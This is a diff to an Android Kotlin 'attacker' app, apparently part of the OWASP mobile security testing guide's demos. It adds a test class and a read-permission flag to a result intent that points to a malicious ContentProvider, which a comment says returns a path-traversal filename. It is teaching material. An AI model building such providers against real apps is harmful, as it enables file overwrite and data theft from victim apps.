@@ -1,8 +1,9 @@
-package org.owasp.mastestapp.attacker
+package org.owasp.mastestapp
 
 import android.app.Activity
 import android.content.ContentProvider
 import android.content.ContentValues
+import android.content.Context
 import android.content.Intent
 import android.database.Cursor
 import android.database.MatrixCursor
@@ -13,6 +14,16 @@ import android.view.Gravity
 import android.widget.TextView
 import java.io.File
 import java.io.FileNotFoundException
+
+// SUMMARY: This sample demonstrates an attacker app that returns a path-traversal filename via a ContentProvider.
+class MastgTest(private val context: Context) {
+
+    fun mastgTest(): String {
+        val r = DemoResults("0x06")
+        r.add(Status.FAIL, "This app should be invoked by an implicit intents from MASTG-DEMO-0x04")
+        return r.toJson()
+    }
+}
 
 class AttackerActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -30,6 +41,7 @@ class AttackerActivity : Activity() {
         } else {
             val resultIntent = Intent()
             resultIntent.data = Uri.parse("content://org.owasp.mastestapp.attacker.provider/fakeFile")
+            resultIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
             setResult(Activity.RESULT_OK, resultIntent)
             finish()
         }
